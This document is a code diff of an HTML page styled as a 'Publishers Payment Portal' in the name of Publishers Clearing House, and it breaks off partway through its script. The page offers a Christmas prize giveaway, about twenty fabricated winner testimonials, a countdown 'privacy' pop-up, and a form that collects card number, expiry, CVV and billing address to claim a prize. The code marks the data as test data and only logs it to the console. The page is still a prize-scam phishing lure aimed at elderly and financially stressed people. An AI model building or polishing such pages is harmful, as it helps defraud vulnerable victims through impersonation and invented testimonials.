@@ -5,228 +5,293 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Publishers Payment Portal</title>
     <style>
-        /* Basic styles */
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #333;
+        :root {
+            --pch-blue: #003366;
+            --pch-gold: #FFD700;
+            --pch-red: #D9232D;
+            --success-green: #28a745;
+            --light-gray: #f4f7f6;
+            --text-dark: #333;
+            --text-light: #555;
+            --border-color: #ddd;
         }
 
+        /* Basic Page Reset */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background-color: var(--light-gray);
+            color: var(--text-dark);
+            line-height: 1.6;
+            scroll-behavior: smooth;
+        }
+
+        /* Main Container */
         .container {
-            width: 100%;
-            max-width: 800px; /* Increased width for testimonials */
-            margin: 0 auto;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.07);
+            border: 1px solid var(--border-color);
         }
 
         /* Header */
-        .pch-header {
-            font-size: 2.75rem; /* Larger font */
-            font-weight: 700;
-            color: #004a99; /* PCH blue */
+        header {
             text-align: center;
-            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 2px dashed var(--border-color);
+            margin-bottom: 25px;
+        }
+
+        header h1 {
+            font-size: 2.5em;
+            color: var(--pch-blue);
+            font-weight: 800;
             text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+            margin: 0;
+        }
+
+        /* Christmas Banner */
+        .christmas-banner {
+            background: linear-gradient(135deg, var(--pch-red), #b30000);
+            color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 25px;
+            box-shadow: 0 4px 12px rgba(217, 35, 45, 0.3);
+            border: 2px solid #fff;
+            animation: pulse 2s infinite;
+        }
+
+        .christmas-banner h2 {
+            margin: 0;
+            font-size: 1.8em;
+            font-weight: 700;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.2);
+        }
+
+        .christmas-banner p {
+            margin: 5px 0 0;
+            font-size: 1.1em;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 4px 12px rgba(217, 35, 45, 0.3); }
+            50% { transform: scale(1.02); box-shadow: 0 6px 20px rgba(217, 35, 45, 0.5); }
+            100% { transform: scale(1); box-shadow: 0 4px 12px rgba(217, 35, 45, 0.3); }
         }
 
         /* Winner Alert Box */
         .winner-alert {
-            background-color: #fff;
-            border: 2px solid #d40000; /* PCH red */
-            border-radius: 12px;
+            background-color: #fffbeb;
+            border: 1px solid #fde081;
+            border-radius: 8px;
             padding: 20px;
             margin-bottom: 25px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: left;
         }
 
-        .winner-alert-title {
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: #d40000;
+        .winner-alert h3 {
+            color: #7a5f00;
+            font-size: 1.4em;
             margin-top: 0;
+            font-weight: 700;
+        }
+
+        .winner-alert p {
+            font-size: 1.1em;
+            color: #5f4a00;
             margin-bottom: 15px;
-            text-align: center;
         }
 
-        .winner-alert-list {
+        .winner-alert ul {
+            list-style-type: none;
+            padding-left: 0;
             margin: 0;
-            padding-left: 20px;
-            list-style-type: '⚠️';
-            padding-inline-start: 1.5rem;
         }
 
-        .winner-alert-list li {
-            padding-left: 10px;
+        .winner-alert ul li {
+            position: relative;
+            padding-left: 30px;
+            font-size: 1.05em;
+            color: var(--text-light);
             margin-bottom: 10px;
-            font-weight: 500;
-            line-height: 1.5;
         }
-        
-        .winner-alert-list li::marker {
-            font-size: 1.2rem;
+
+        .winner-alert ul li::before {
+            content: '⚠️';
+            position: absolute;
+            left: 0;
+            top: 0;
+            font-size: 1.1em;
         }
 
         /* Testimonials */
-        .testimonial-container {
-            background-color: #ffffff;
-            border-radius: 12px;
-            padding: 24px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        .testimonials {
             margin-bottom: 25px;
         }
-        
-        .testimonial-container h2 {
+
+        .testimonials h2 {
             text-align: center;
-            color: #004a99;
-            margin-top: 0;
+            color: var(--pch-blue);
+            font-weight: 700;
             margin-bottom: 20px;
-            font-size: 1.5rem;
         }
 
-        .testimonial-scroll-box {
-            max-height: 350px;
+        .testimonial-scroll-container {
+            max-height: 400px;
             overflow-y: auto;
-            border-top: 1px solid #eee;
-            border-bottom: 1px solid #eee;
-            padding: 10px 15px;
-            background: #fdfdfd;
+            border: 1px solid var(--border-color);
             border-radius: 8px;
+            padding: 10px 20px;
+            background-color: #fdfdfd;
         }
 
-        .testimonial {
-            border-bottom: 1px dashed #ddd;
+        .testimonial-item {
+            border-bottom: 1px dashed #eee;
             padding: 15px 0;
-            margin-bottom: 10px;
         }
 
-        .testimonial:last-child {
+        .testimonial-item:last-child {
             border-bottom: none;
-            margin-bottom: 0;
         }
 
-        .testimonial p {
+        .testimonial-item p {
             font-style: italic;
-            line-height: 1.6;
-            color: #444;
-            margin-bottom: 8px;
+            color: var(--text-light);
+            margin: 0 0 8px 0;
+            quotes: "“" "”";
         }
 
-        .testimonial-author {
+        .testimonial-item p::before {
+            content: open-quote;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #aaa;
+        }
+
+        .testimonial-item p::after {
+            content: close-quote;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #aaa;
+        }
+
+        .testimonial-item .author {
             font-style: normal;
             font-weight: 600;
-            color: #004a99;
+            color: var(--pch-blue);
             text-align: right;
         }
         
-        .testimonial-date {
+        .testimonial-item .date {
             font-style: normal;
-            font-size: 0.85rem;
-            color: #777;
+            font-size: 0.9em;
+            color: #888;
             text-align: right;
-            margin-top: 4px;
+            display: block;
         }
 
-        /* Main Action Button */
-        .start-button {
-            display: block;
-            width: 100%;
-            padding: 18px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #fff;
-            background-color: #28a745;
+        /* Payment Flow Button */
+        .payment-flow-button-container {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .payment-flow-button {
+            background: linear-gradient(180deg, #4CAF50, #388E3C);
+            color: white;
+            padding: 18px 35px;
+            font-size: 1.4em;
+            font-weight: bold;
+            text-decoration: none;
             border: none;
             border-radius: 8px;
             cursor: pointer;
-            text-align: center;
-            text-decoration: none;
-            transition: background-color 0.3s ease, transform 0.1s ease;
-            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);
+            box-shadow: 0 4px 10px rgba(0,0,0,0.15);
+            transition: all 0.2s ease-in-out;
+            display: inline-block;
         }
 
-        .start-button:hover {
-            background-color: #218838;
-        }
-        
-        .start-button:active {
-            transform: scale(0.99);
+        .payment-flow-button:hover {
+            background: linear-gradient(180deg, #5cb85c, #449d44);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.2);
+            transform: translateY(-2px);
         }
 
         /* Modal Overlay */
         .modal-overlay {
-            visibility: hidden;
-            opacity: 0;
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.6);
+            background-color: rgba(0, 0, 0, 0.7);
             display: flex;
             justify-content: center;
             align-items: center;
             z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
             transition: opacity 0.3s ease, visibility 0.3s ease;
         }
 
-        .modal-overlay.active {
-            visibility: visible;
+        .modal-overlay.show {
             opacity: 1;
+            visibility: visible;
         }
 
-        .modal-popup {
-            background: #fff;
+        .modal-content {
+            background-color: white;
             padding: 30px 40px;
             border-radius: 12px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
             text-align: center;
             max-width: 450px;
             width: 90%;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
             transform: scale(0.9);
             transition: transform 0.3s ease;
         }
-        
-        .modal-overlay.active .modal-popup {
+
+        .modal-overlay.show .modal-content {
             transform: scale(1);
         }
 
-        .modal-popup h3 {
+        .modal-content h2 {
+            color: var(--pch-blue);
             margin-top: 0;
-            color: #d40000;
-            font-size: 1.5rem;
+            font-size: 1.5em;
         }
 
-        .modal-popup p {
-            font-size: 1rem;
-            line-height: 1.6;
+        .modal-content p {
+            font-size: 1.1em;
+            color: var(--text-light);
             margin-bottom: 20px;
         }
 
         #countdown-timer {
-            font-size: 1.2rem;
-            font-weight: 600;
-            color: #004a99;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: var(--pch-red);
         }
 
         /* Payment Form */
         .payment-form-container {
             display: none; /* Hidden by default */
-            background: #fff;
-            padding: 30px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
-            margin-top: 25px;
+            border-top: 2px dashed var(--border-color);
+            padding-top: 25px;
+            max-width: 550px;
+            margin: 0 auto;
         }
 
         .payment-form-container h2 {
             text-align: center;
-            color: #004a99;
-            margin-top: 0;
+            color: var(--pch-blue);
+            font-weight: 700;
             margin-bottom: 25px;
         }
 
@@ -238,86 +303,97 @@
             display: block;
             margin-bottom: 8px;
             font-weight: 600;
-            color: #555;
+            color: var(--text-dark);
         }
 
         .form-group input {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            box-sizing: border-box; /* Ensures padding doesn't affect width */
-            font-size: 1rem;
+            padding: 12px 15px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 1em;
+            box-sizing: border-box; /* Important for padding to work correctly */
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
 
         .form-group input:focus {
             outline: none;
-            border-color: #004a99;
-            box-shadow: 0 0 5px rgba(0, 74, 153, 0.3);
+            border-color: var(--pch-blue);
+            box-shadow: 0 0 5px rgba(0, 51, 102, 0.2);
         }
 
-        /* Flex row for Expiry and CVV */
         .form-row {
             display: flex;
-            gap: 15px;
+            gap: 20px;
         }
 
         .form-row .form-group {
-            width: 50%;
+            flex: 1;
         }
 
-        /* Submit Button */
         .submit-button {
             width: 100%;
+            background: linear-gradient(180deg, var(--pch-blue), #002244);
+            color: white;
             padding: 15px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #fff;
-            background-color: #004a99;
+            font-size: 1.2em;
+            font-weight: bold;
             border: none;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background 0.3s, transform 0.1s;
         }
 
         .submit-button:hover {
-            background-color: #003a7a;
+            background: linear-gradient(180deg, #004080, #002b5a);
         }
 
-        /* Success Message */
+        .submit-button:active {
+            transform: scale(0.99);
+        }
+
         #success-message {
-            color: #218838;
-            background-color: #e9f5ec;
-            border: 1px solid #b8dfc3;
-            padding: 12px;
-            border-radius: 8px;
-            text-align: center;
             margin-top: 20px;
+            text-align: center;
+            color: var(--success-green);
+            font-weight: bold;
+            font-size: 1.05em;
             display: none; /* Hidden by default */
-            font-weight: 500;
         }
 
-        /* Responsive styles */
-        @media (max-width: 600px) {
-            body {
-                padding: 10px;
-            }
+        /* Responsive Design */
+        @media (max-width: 850px) {
             .container {
-                padding: 0;
+                margin: 10px;
+                padding: 15px;
+                width: auto;
             }
-            .pch-header {
-                font-size: 2rem;
+        }
+
+        @media (max-width: 600px) {
+            header h1 {
+                font-size: 2em;
             }
+
+            .christmas-banner h2 {
+                font-size: 1.5em;
+            }
+
+            .payment-flow-button {
+                font-size: 1.2em;
+                padding: 15px 30px;
+                width: 100%;
+                box-sizing: border-box;
+            }
+
             .form-row {
                 flex-direction: column;
                 gap: 0;
             }
-            .form-row .form-group {
-                width: 100%;
-            }
-            .modal-popup {
-                width: 85%;
-                padding: 25px;
+
+            .modal-content {
+                width: 90%;
+                padding: 20px;
             }
         }
     </style>
@@ -325,146 +401,136 @@
 <body>
 
     <div class="container">
-        <h1 class="pch-header">PUBLISHERS PAYMENT PORTAL</h1>
-        
-        <!-- === UPDATED WARNING BLOCK === -->
+        <header>
+            <h1>PUBLISHERS PAYMENT PORTAL</h1>
+        </header>
+
+        <!-- Christmas Giveaway Banner -->
+        <div class="christmas-banner">
+            <h2>&#127876; Our Early Christmas Giveaway Is Here! &#127876;</h2>
+            <p>Congratulations to all our lucky winners!</p>
+        </div>
+
+        <!-- Winner Alert -->
         <div class="winner-alert">
-            <h2 class="winner-alert-title">Important Security Warning for Winners!</h2>
-            <ul class="winner-alert-list">
-                <li>Your Package Number is private. Do not use it as a password for any website or give it to anyone. Scammers can use it to try and claim your package without your knowledge.</li>
+            <h3>&#128274; WINNER'S SECURITY ALERT!</h3>
+            <p>Your security is our top priority. Please read these important points to protect your winnings:</p>
+            <ul>
+                <li>Never use your private Package Number as a password for any website. Scammers can use it to try and claim your prize without your knowledge.</li>
             </ul>
         </div>
-        
-        <!-- === NEW TESTIMONIALS BLOCK === -->
-        <div class="testimonial-container">
+
+        <!-- Testimonials -->
+        <div class="testimonials">
             <h2>YOU CAN READ BELOW A FEW COMMENTS FROM OUR PAST WINNERS</h2>
-            <div class="testimonial-scroll-box">
-                
-                <div class="testimonial">
-                    <p>"I still can't believe it. I saw the van pull up, and honestly, I thought it was a delivery for my neighbor. When they came to my door with that giant check... I just burst into tears. This changes everything for my family. We can finally pay off the house. Thank you, PCH!"</p>
-                    <div class="testimonial-author">- Margaret H.</div>
-                    <div class="testimonial-date">Nov 14, 2025</div>
+            <div class="testimonial-scroll-container">
+                <div class="testimonial-item">
+                    <p>I still can't believe it. When I saw the van pull up, I thought it was a joke. $10,000! This is life-changing. My hands were shaking so bad I could barely hold the check. Thank you, PCH, you've made this old mailman's year!</p>
+                    <span class="author">- Frank G., Ohio</span>
+                    <span class="date">Nov 12, 2025</span>
                 </div>
-                
-                <div class="testimonial">
-                    <p>"I've been playing for years, just for fun. Never in a million years did I expect to win. $10,000! It might not be the 'big one' you see on TV, but it's a huge blessing for me. I'm taking my grandkids on a real vacation. My heart is so full."</p>
-                    <div class="testimonial-author">- David L.</div>
-                    <div class="testimonial-date">Sep 02, 2025</div>
+                <div class="testimonial-item">
+                    <p>I've been playing for 15 years, just for fun. Never in a million years did I expect to win the $5,000 A Week 'Forever' prize. My family is set. My grandkids are set. It's a miracle. I'm just... I'm speechless.</p>
+                    <span class="author">- Brenda W., California</span>
+                    <span class="date">Sep 2, 2025</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"My wife nearly fainted, and I'm pretty sure I forgot how to breathe! We won the $1 Million prize. It feels like a dream. We're going to set up college funds for our kids and donate to our local animal shelter. This is more than just money; it's peace of mind."</p>
-                    <div class="testimonial-author">- Frank & Sarah K.</div>
-                    <div class="testimonial-date">Jun 21, 2025</div>
+                <div class="testimonial-item">
+                    <p>My husband always teased me for entering every day. Well, who's laughing now! We won $25,000! We're paying off our car and taking our first real vacation in a decade. Don't give up, people, it really happens!</p>
+                    <span class="author">- Maria S., Florida</span>
+                    <span class="date">Jul 21, 2025</span>
                 </div>
-                
-                <div class="testimonial">
-                    <p>"When I got the email, I thought it was a scam. But I followed the instructions, and sure enough, a few weeks later, a check for $5,000 arrived. I'm using it to fix my old truck, which I need for work. It couldn't have come at a better time."</p>
-                    <div class="testimonial-author">- James B.</div>
-                    <div class="testimonial-date">Feb 11, 2025</div>
+                <div class="testimonial-item">
+                    <p>I won $1,000 on a scratch-off token! It couldn't have come at a better time. My water heater broke last week, and this covers the replacement exactly. It's not a million, but to me, it's a huge blessing. Thank you!</p>
+                    <span class="author">- David K., Pennsylvania</span>
+                    <span class="date">Jun 5, 2025</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I was skeptical, I'll admit it. My kids always laughed at me for entering. Well, who's laughing now! I won $25,000! The first thing I did was call them and say, 'Guess what!' It felt so good. I'm finally remodeling my kitchen."</p>
-                    <div class="testimonial-author">- Brenda W.</div>
-                    <div class="testimonial-date">Oct 30, 2024</div>
+                <div class="testimonial-item">
+                    <p>$50,000! I screamed so loud my neighbor called to see if I was okay. I'm paying off my student loans and starting a college fund for my daughter. This is a fresh start I desperately needed.</p>
+                    <span class="author">- Aisha J., Texas</span>
+                    <span class="date">Mar 18, 2025</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"The Prize Patrol is real! They showed up, balloons and all. I won $5,000 a week for life. I just... I still don't have words. I'm 68 years old, and I can finally retire and not worry about a single bill. God bless Publishers Clearing House."</p>
-                    <div class="testimonial-author">- Michael T.</div>
-                    <div class="testimonial-date">Aug 19, 2024</div>
+                <div class="testimonial-item">
+                    <p>I'm a disabled veteran on a fixed income. Winning $2,500 means I can afford the new ramp for my house and get my service dog some much-needed vet care. This is more than just money, it's peace of mind.</p>
+                    <span class="author">- Sgt. (Ret.) Bill T., North Carolina</span>
+                    <span class="date">Jan 9, 2025</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I'm a single mom, and money has always been tight. Winning $50,000 means I can pay off my student loans and start a savings account for my daughter. It's like a mountain has been lifted off my shoulders. I cried for a week straight, happy tears!"</p>
-                    <div class="testimonial-author">- Jennifer P.</div>
-                    <div class="testimonial-date">May 05, 2024</div>
+                <div class="testimonial-item">
+                    <p>The Prize Patrol is real! They showed up with balloons, champagne, and a check for $100,000. I'm still in shock. I'm going to remodel my mom's kitchen and put a down payment on a house. Dreams do come true.</p>
+                    <span class="author">- Sarah L., Oregon</span>
+                    <span class="date">Dec 1, 2024</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I won a new Ford Explorer! I've been driving the same car for 17 years, and it was barely holding on. To get a call saying I'd won a brand new car... I thought it was a prank. But it's real, and it's beautiful. I feel so safe driving it."</p>
-                    <div class="testimonial-author">- Robert G.</div>
-                    <div class="testimonial-date">Jan 22, 2024</div>
+                <div class="testimonial-item">
+                    <p>I thought it was a scam at first, but it's 100% real. I won a new Ford Explorer! My old car was on its last legs. I cried when they handed me the keys. I've been a loyal player for 20 years, and it finally paid off!</p>
+                    <span class="author">- Robert M., Illinois</span>
+                    <span class="date">Oct 22, 2024</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"Just a little prize, $1,000, but it made my whole month. I used it to buy groceries and pay my electric bill. It was a real help when I desperately needed it. Every little bit counts, so don't stop playing!"</p>
-                    <div class="testimonial-author">- Emily F.</div>
-                    <div class="testimonial-date">Nov 12, 2023</div>
+                <div class="testimonial-item">
+                    <p>$5,000. Just like that. I'm going to use it to visit my family back in the Philippines. I haven't seen them in six years. PCH isn't just giving away money, you're reuniting families. God bless you.</p>
+                    <span class="author">- Emelita R., New Jersey</span>
+                    <span class="date">Aug 14, 2024</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"My husband and I are going on our first real honeymoon... 30 years after we got married! We won $10,000 and we're going to Hawaii. I've dreamed of it my whole life. Thank you PCH for making dreams come true."</p>
-                    <div class="testimonial-author">- Susan and Tom R.</div>
-                    <div class="testimonial-date">Jul 01, 2023</div>
+                <div class="testimonial-item">
+                    <p>My wife and I have been entering since the 90s. We just won $15,000. We're both retired, and this will help so much with medical bills and property taxes. It's a huge weight off our shoulders.</p>
+                    <span class="author">- Arthur & Jean B., Arizona</span>
+                    <span class="date">May 30, 2024</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I saw the big check and just stared. $100,000. It didn't seem real. I'm a disabled veteran, and this money is going to help me make my home more accessible. It's a miracle. That's the only word for it."</p>
-                    <div class="testimonial-author">- George M.</div>
-                    <div class="testimonial-date">Apr 16, 2023</div>
+                 <div class="testimonial-item">
+                    <p>I'm a single mom of three. I won $500, and it let me buy all my kids new shoes for school and fill the fridge. It might seem small to some, but to us, it was everything. I was so stressed, and this was a little miracle.</p>
+                    <span class="author">- Crystal H., Georgia</span>
+                    <span class="date">Apr 11, 2024</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I play on the PCH app every day. I love the games! I was shocked when I got an email saying I'd won $2,500. I thought it was fake, but it wasn't! The money was a huge help for my son's college textbooks."</p>
-                    <div class="testimonial-author">- Karen C.</div>
-                    <div class="testimonial-date">Jan 09, 2023</div>
+                <div class="testimonial-item">
+                    <p>Wow! $10,000! I'm an artist, and I'm going to use this to build a proper studio in my backyard. I've been dreaming of this for years. This is the seed money for my dream! Thank you, PCH, for supporting the arts!</p>
+                    <span class="author">- "Sketch" M., Colorado</span>
+                    <span class="date">Feb 29, 2024</span>
                 </div>
-                
-                <div class="testimonial">
-                    <p>"I'm still shaking! The Prize Patrol just left my house. $50,000! I'm going to pay off all my credit card debt and finally be free. I can't thank PCH enough. I've been entering for 20 years, and I'm proof it can happen!"</p>
-                    <div class="testimonial-author">- Linda S.</div>
-                    <div class="testimonial-date">Oct 28, 2022</div>
+                <div class="testimonial-item">
+                    <p>I never win *anything*. Not even a free coffee. Then I get an email, and I won $7,500 in the weekly drawing. I'm taking my grandkids to Disney World. Their faces are going to be priceless!</p>
+                    <span class="author">- Gary P., Wisconsin</span>
+                    <span class="date">Dec 20, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I won $15,000! I'm a retired teacher, and this will make my retirement so much more comfortable. I'm going to visit my sister in California; I haven't seen her in five years. I am just over the moon with joy."</p>
-                    <div class="testimonial-author">- Mary J.</div>
-                    <div class="testimonial-date">Aug 07, 2022</div>
+                <div class="testimonial-item">
+                    <p>I won the $1.25 Million prize. I still feel like I'm dreaming. I paid off my mortgage. I'm writing this from my debt-free home. The feeling is indescribable. My advice? Keep playing. You just never know.</p>
+                    <span class="author">- Jennifer K., Washington</span>
+                    <span class="date">Nov 5, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"They really do show up at your door! I was in my bathrobe! I was so embarrassed, but I didn't care once I saw the check for $5,000 a week for life. My life is forever changed. I'm going to help my whole family."</p>
-                    <div class="testimonial-author">- Daniel V.</div>
-                    <div class="testimonial-date">May 15, 2022</div>
+                <div class="testimonial-item">
+                    <p>My diner was struggling after the pandemic. I won $20,000 from PCH, and it was the lifeline I needed to keep the doors open, repair the old grill, and keep my staff employed. You didn't just give me money, you saved a local business.</p>
+                    <span class="author">- Sal "The Grill" P., New York</span>
+                    <span class="date">Sep 1, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"My roof was leaking, and I had no idea how I was going to fix it. Then I got the call... I won $20,000. It's enough to get a new roof and fix the water damage. It felt like someone was listening. Thank you, thank you."</p>
-                    <div class="testimonial-author">- Patricia D.</div>
-                    <div class="testimonial-date">Feb 03, 2022</div>
+                <div class="testimonial-item">
+                    <p>I won $1,000. I bought a new laptop for college. My old one was so slow I couldn't run the software for my engineering classes. This is a game-changer for my education. Thank you for investing in my future!</p>
+                    <span class="author">- Kevin F., Massachusetts</span>
+                    <span class="date">Jul 19, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I'm 28, and I just won $10,000. I never thought young people won! I'm putting it all straight into my savings for a down payment on a house. This is an incredible head start. I'm so grateful."</p>
-                    <div class="testimonial-author">- Mike R.</div>
-                    <div class="testimonial-date">Nov 20, 2021</div>
+                <div class="testimonial-item">
+                    <p>My garden is my passion. I won $5,000, and I'm building a beautiful new greenhouse and a koi pond. It's my little slice of heaven, and PCH made it possible. I'm so grateful.</p>
+                    <span class="author">- Margaret T., Virginia</span>
+                    <span class="date">Apr 2, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I won $2,500 just by playing games on my phone. It was so easy. I'm using the money to buy a new computer for my daughter, who's starting college. She's so excited, and I'm so happy I could do this for her."</p>
-                    <div class="testimonial-author">- Theresa G.</div>
-                    <div class="testimonial-date">Aug 14, 2021</div>
+                <div class="testimonial-item">
+                    <p>I'm a teacher, and I won $2,500. I spent all of it on books and supplies for my classroom. My students were so excited. Seeing their joy was worth more than a million. But the $2,500 helped make it happen!</p>
+                    <span class="author">- Lisa C., Michigan</span>
+                    <span class="date">Feb 14, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I saw the ad on TV and thought, 'Why not?' I've been entering ever since. Today, I won $75,000. I'm speechless. I'm going to pay off my car and take my wife on a cruise. It's just... wow. Just wow."</p>
-                    <div class="testimonial-author">- William P.</div>
-                    <div class="testimonial-date">May 02, 2021</div>
+                <div class="testimonial-item">
+                    <p>I've played PCH games on my phone for years. It's how I relax. I won $10,000 on the app! I'm taking my wife on an anniversary trip to Hawaii, something I've promised her for 20 years. Aloha, PCH!</p>
+                    <span class="author">- Mike D., Nevada</span>
+                    <span class="date">Jan 3, 2023</span>
                 </div>
-
-                <div class="testimonial">
-                    <p>"I won $500. It's not millions, but it made me believe! It paid for my car repairs, and I was so thankful. I'm going to keep playing, because now I know it's real. People really do win!"</p>
-                    <div class="testimonial-author">- Charles W.</div>
-                    <div class="testimonial-date">Feb 17, 2021</div>
+                <div class="testimonial-item">
+                    <p>I honestly didn't believe it until the check cleared. $50,000. I'm... stunned. I'm a truck driver, and I'm going to use this to pay off my rig and finally be my own boss. This is the American dream. Thank you.</p>
+                    <span class="author">- "Big" Jim R., Tennessee</span>
+                    <span class="date">Oct 28, 2022</span>
                 </div>
-
             </div>
         </div>
-
-        <!-- Main Action Button -->
-        <a href="#" id="start-flow-button" class="start-button">Claim Your Package Now</a>
+        
+        <!-- Payment Flow Start -->
+        <div class="payment-flow-button-container">
+            <a href="#" id="start-payment-flow" class="payment-flow-button">Claim Your Christmas Package Now!</a>
+        </div>
 
         <!-- Payment Form (hidden by default) -->
         <div id="payment-form" class="payment-form-container">
@@ -476,7 +542,7 @@
                 </div>
                 <div class="form-row">
                     <div class="form-group">
-                        <label for="expiry-date">Expiry Date (MM/YY)</label>
+                        <label for="expiry-date">Expiry Date</label>
                         <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
                     </div>
                     <div class="form-group">
@@ -496,105 +562,106 @@
         </div>
     </div>
 
-    <!-- Modal Overlay -->
-    <div id="modal-overlay" class="modal-overlay">
-        <div class="modal-popup">
-            <h3>Winner Security Verified</h3>
-            <p>Your privacy is our top priority. <strong>No winner's personal information is ever shared.</strong></p>
+    <!-- Modal Overlay (hidden by default) -->
+    <div id="test-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h2>Your Privacy is Our Priority</h2>
+            <p>At Publishers Clearing House, we are committed to protecting our winners. <strong>No winner's personal information has ever been shared.</strong></p>
             <div id="countdown-timer">Continuing in 5 seconds...</div>
         </div>
     </div>
 
     <script>
-        // Get elements
-        const startButton = document.getElementById('start-flow-button');
-        const modalOverlay = document.getElementById('modal-overlay');
+        // Get all necessary elements
+        const startButton = document.getElementById('start-payment-flow');
+        const modal = document.getElementById('test-modal');
         const countdownTimer = document.getElementById('countdown-timer');
-        const paymentForm = document.getElementById('payment-form');
+        const paymentFormContainer = document.getElementById('payment-form');
         const testForm = document.getElementById('test-form');
         const successMessage = document.getElementById('success-message');
         const cardNumberInput = document.getElementById('card-number');
-        const expiryInput = document.getElementById('expiry-date');
+        const expiryDateInput = document.getElementById('expiry-date');
 
-        // 1. Start Button Click
-        startButton.addEventListener('click', function(e) {
-            e.preventDefault();
-            modalOverlay.classList.add('active');
-            
-            // Start 5-second countdown
-            let seconds = 5;
-            countdownTimer.textContent = `Continuing in ${seconds} seconds...`;
-            
-            const interval = setInterval(() => {
-                seconds--;
-                countdownTimer.textContent = `Continuing in ${seconds} seconds...`;
-                
-                if (seconds <= 0) {
-                    clearInterval(interval);
-                    modalOverlay.classList.remove('active');
-                    // Hide button and show form
-                    startButton.style.display = 'none';
-                    paymentForm.style.display = 'block';
+        let countdown = 5;
+        let countdownInterval;
+
+        // Function to show the modal
+        function showModal(e) {
+            e.preventDefault(); // Stop the link from jumping
+            countdown = 5; // Reset countdown
+            countdownTimer.textContent = `Continuing in ${countdown} seconds...`;
+            modal.classList.add('show');
+
+            // Start the countdown
+            countdownInterval = setInterval(() => {
+                countdown--;
+                if (countdown > 0) {
+                    countdownTimer.textContent = `Continuing in ${countdown} seconds...`;
+                } else {
+                    countdownTimer.textContent = `Continuing in 0 seconds...`;
+                    clearInterval(countdownInterval);
+                    hideModal();
                 }
             }, 1000);
-        });
+        }
 
-        // 2. Form Submission
-        testForm.addEventListener('submit', function(e) {
-            e.preventDefault(); // Prevent actual form submission
-            
-            // Collect data into an object
-            const testPaymentData = {
+        // Function to hide the modal and show the form
+        function hideModal() {
+            modal.classList.remove('show');
+            paymentFormContainer.style.display = 'block';
+            // Scroll to the form
+            paymentFormContainer.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Function to handle form submission
+        function handleFormSubmit(e) {
+            e.preventDefault(); // Stop the form from actually submitting
+
+            // Get values from the form
+            const paymentData = {
                 cardNumber: document.getElementById('card-number').value,
                 expiryDate: document.getElementById('expiry-date').value,
                 cvv: document.getElementById('cvv').value,
                 billingAddress: document.getElementById('billing-address').value,
-                timestamp: new Date().toISOString()
             };
-            
-            // Log data to console
-            console.log("--- TEST PAYMENT DATA (NO REAL TRANSACTION) ---");
-            console.log(testPaymentData);
-            console.log("-------------------------------------------------");
 
-            // Show success message
+            // Log the data to the console
+            console.log("Test payment data (no real transaction):", paymentData);
+
+            // Show the success message
             successMessage.style.display = 'block';
-            
-            // Optional: Hide message after a few seconds
-            setTimeout(() => {
-                successMessage.style.display = 'none';
-            }, 5000);
-            
-            // Clear form
-            testForm.reset();
-        });
 
-        // 3. Input Formatting (Card Number with spaces)
-        cardNumberInput.addEventListener('input', function (e) {
-            let target = e.target;
-            let value = target.value.replace(/\D/g, ''); // Remove non-numeric
+            // Optional: Reset the form
+            // testForm.reset();
+        }
+
+        // Function to auto-format card number with spaces
+        function formatCardNumber(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
             let formattedValue = '';
-            
